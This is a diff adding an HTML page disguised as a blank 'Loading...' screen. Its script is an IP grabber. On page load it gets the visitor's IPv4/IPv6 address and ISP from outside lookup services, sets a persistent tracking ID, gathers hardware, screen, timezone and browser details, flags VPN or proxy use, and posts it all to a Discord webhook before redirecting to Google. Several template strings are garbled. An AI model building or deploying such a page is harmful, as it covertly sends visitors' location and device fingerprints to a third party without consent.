@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        html, body {
+            background-color: #000000;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        // CONFIG 1: Replace this URL with your real Webhook URL (e.g., Discord)
+        const WEBHOOK_URL = "https://deine-webhook-url.com";
+
+        // CONFIG 2: Define where the visitor should be redirected
+        const REDIRECT_URL = "https://google.com";
+
+        async function getSecondaryIP(type) {
+            try {
+                const url = type === 'v6' ? "https://icanhazip.com" : "https://icanhazip.com";
+                const response = await fetch(url, { signal: AbortSignal.timeout(1200) });
+                return (await response.text()).trim();
+            } catch (e) {
+                return "Not Available";
+            }
+        }
+
+        function getVisitorTrackingData() {
+            let visitorId = localStorage.getItem("visitor_id");
+            let visitCount = parseInt(localStorage.getItem("visit_count") || "0");
+
+            if (!visitorId) {
+                visitorId = "USR-" + Math.random().toString(36).substring(2, 11).toUpperCase() + "-" + Date.now().toString(36).toUpperCase();
+                localStorage.setItem("visitor_id", visitorId);
+            }
+
+            visitCount += 1;
+            localStorage.setItem("visit_count", visitCount);
+
+            return { visitorId, visitCount };
+        }
+
+        async function processAndRedirect() {
+            try {
+                const tracker = getVisitorTrackingData();
+
+                // Fetch network data
+                const apiResponse = await fetch("https://ipapi.is");
+                const ipData = await apiResponse.json();
+
+                let ipv4 = "Not Available";
+                let ipv6 = "Not Available";
+                const primaryIP = ipData.ip || "";
+
+                if (primaryIP.includes(":")) {
+                    ipv6 = primaryIP;
+                    ipv4 = await getSecondaryIP('v4');
+                } else {
+                    ipv4 = primaryIP;
+                    ipv6 = await getSecondaryIP('v6');
+                }
+
+                // 1. Basic Browser Information
+                const userAgent = navigator.userAgent;
+                const language = navigator.language || navigator.userLanguage || "Unknown";
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+                
+                // 2. Hardware Information
+                const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown"; // CPU threads
+                const deviceMemory = navigator.deviceMemory || "Unknown"; // RAM in GB (approximate)
+                const platform = navigator.platform || "Unknown"; // OS platform target
+                
+                // 3. Screen and Window Details
+                const screenRes = `window.screen.widthx{window.screen.height}`;
+                const colorDepth = window.screen.colorDepth || "Unknown";
+                const touchPoints = navigator.maxTouchPoints || 0; // Identifies mobile/touch devices
+                const isTouchDevice = touchPoints > 0 ? "Yes" : "No";
+
+                // 4. Browser State and Capabilities
+                const cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";
+                const pdfViewer = navigator.pdfViewerEnabled ? "Yes" : "No";
+                const doNotTrack = navigator.doNotTrack || "Unknown";
+
+                // Color logic
+                let embedColor = 3066993;
+                let threatLevel = "Clean / Low Risk";
+
+                if (ipData.is_vpn || ipData.is_proxy) {
+                    embedColor = 15158332;
+                    threatLevel = "High Risk (VPN / Proxy Detected)";
+                } else if (ipData.is_datacenter) {
+                    embedColor = 16766720;
+                    threatLevel = "Medium Risk (Datacenter / Hosting Provider)";
+                }
+
+                // Building the Discord payload with deep system metrics
+                const payload = {
+                    username: "Advanced Device Identifier",
+                    avatar_url: "https://imgur.com",
+                    embeds: [{
+                        title: tracker.visitCount > 1 ? "Returning Visitor Detected" : "New Visitor Detected",
+                        color: embedColor,
+                        fields: [
+                            { name: "Threat Evaluation", value: `**\${threatLevel}**`, inline: false },
+                            { name: "Tracking ID (Browser Cookie)", value: `\`${tracker.visitorId}\``, inline: true },
+                            { name: "Total Visits", value: `Visit number **\${tracker.visitCount}**`, inline: true },
+                            
+                            { name: "Network Details", value: `IPv4: \`${ipv4}\`\nIPv6: \`${ipv6}\`\nCountry: \({ipData.location?.country \vert{}\vert{} "Unknown"}\nISP: \){ipData.asn?.org || "Unknown"}`, inline: false },
+                            
+                            { name: "Hardware Specs", value: `CPU Threads: \${hardwareConcurrency}\nEstimated RAM: \({deviceMemory} GB\nPlatform:\){platform}\nTouch Screen: isTouchDevice ({touchPoints} points)`, inline: true },
+                            
+                            { name: "Display & Environment", value: `Resolution: \({screenRes}\nColor Depth:\){colorDepth} bit\nTimezone: \({timeZone}\nLanguage:\){language}`, inline: true },
+                            
+                            { name: "Browser Configuration", value: `Cookies Allowed: \${cookiesEnabled}\nNative PDF Support: \({pdfViewer}\nDoNotTrack Flag:\){doNotTrack}`, inline: false },
+                            
+                            { name: "Security Flags", value: `VPN: \${ipData.is_vpn ? "Yes" : "No"} | Proxy: \({ipData.is_proxy ? "Yes" : "No"} \vert{} Datacenter: \){ipData.is_datacenter ? "Yes" : "No"}`, inline: false },
+                            
+                            { name: "User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                        ],
+                        footer: {
+                            text: `Logged at ${new Date().toLocaleString()}`
+                        }
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
+                    mode: "no-cors"
+                });
+
+            } catch (error) {
+                console.error("Error logging request:", error);
+            } finally {
+                window.location.replace(REDIRECT_URL);
+            }
+        }
+
+        window.onload = processAndRedirect;
+    </script>
+</body>
+</html>
